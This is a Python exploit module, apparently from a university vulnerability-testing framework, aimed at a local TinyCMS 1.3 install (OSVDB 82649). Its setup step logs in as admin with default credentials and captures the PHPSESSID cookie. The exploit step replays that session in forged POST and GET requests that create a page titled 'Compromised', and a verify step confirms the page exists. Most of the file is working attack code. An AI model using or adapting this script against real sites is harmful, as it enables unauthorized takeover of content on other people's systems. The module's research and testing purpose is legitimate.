
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import os
import urllib
import httplib
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_82649",
                  'Description' : "TinyCMS contains a flaw that allows a remote Cross-site Request Forgery " \
                                  "(CSRF / XSRF) attack. The flaw exists because the application does not require " \
                                  "multiple steps or explicit confirmation for sensitive transactions for uploading " \
                                  "files. By using a crafted URL (e.g., a crafted GET request inside an img tag), an " \
                                  "attacker may trick the victim into clicking on the image to take advantage of the " \
                                  "trust relationship between the authenticated victim and the application. Such an " \
                                  "attack could trick the victim into uploading a file in the context of their session " \
                                  "with the application, without further prompting or verification.",
                  'References' :   [['OSVDB', '82649'],
                                   ['http://packetstormsecurity.com/files/113222/TinyCMS-1.3-CSRF-LFI-File-Upload.html']],
                  'Target' : "TinyCMS 1.3",
                  'Type' : 'LFI',
                  'Privileged' : False
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20130806 Firefox/17.0 Iceweasel/17.0.8"        
        return

    def setup(self, target_system_dir):

        driver = self.create_selenium_driver(javascript=False, user_agent=self.user_agent)
        driver.get("http://127.0.0.1/tinycms/?view=admin")

        driver.get_element(by_xpath="//input[@name='username']").send_keys("admin")
        driver.get_element(by_xpath="//input[@name='password']").send_keys("pass")
        driver.get_element(by_xpath="//input[@value='Login']").click()
        driver.get_element(by_link_text="Logout", attempts=10)
        
        cookies = driver.get_cookies()
        driver.cleanup()
        
        for cookie in cookies:
            if cookie.has_key('name') and \
                    cookie['name'] == "PHPSESSID" and \
                    cookie.has_key('value'):
                self.write_tmpfile(cookie['value'])
            else:
                self.logger.error("Unable to obtain PHPSESSID for admin session")
                exit(-1)

        return

    def exploit(self):

        phpsessid = self.read_tmpfile()
         
        self.logger.info("Using PHPSESSID: %s", phpsessid)

        form_data = urllib.urlencode({'title' : 'Compromised',
                                      'page' : 'I did not intend for this to happen.'})

        headers = {"Referer":"http://127.0.0.1/tinycms/?view=admin&do=pages&create=new",
                   "User-Agent":self.user_agent, # used by tinycms for auth hash
                   "Host":"127.0.0.1",
                   "Content-Type":"application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Cookie": "PHPSESSID=%s" % (phpsessid,),
                   "Content-Length":"59"}
        
        conn = httplib.HTTPConnection("127.0.0.1")
        conn.request("POST",
                     "http://127.0.0.1/tinycms/?view=admin&do=pages&create=new&save=1",
                     form_data,
                     headers)
        
        response = conn.getresponse()
        data = response.read()

        headers = {"Referer":"http://127.0.0.1/tinycms/?view=admin&do=pages&create=new",
                   "User-Agent":self.user_agent,
                   "Host":"127.0.0.1",
                   "Content-Type":"application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Cookie": "PHPSESSID=%s" % (phpsessid,)}
                   
        
        conn.request("GET",
                     "http://127.0.0.1/tinycms/?view=admin&do=pages&edit=Compromised&updated=2",
                     "",
                     headers)
        
        response = conn.getresponse()
        data = response.read()
        conn.close()
        return

            
    def verify(self):
        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/tinycms")
        
        if(driver.page_source.find("Compromised") != -1):
            self.logger.info("The compromised post has been confirmed")
            verified = True
        else:
            self.logger.error("Could not find compromised post")

        driver.cleanup()
        return verified
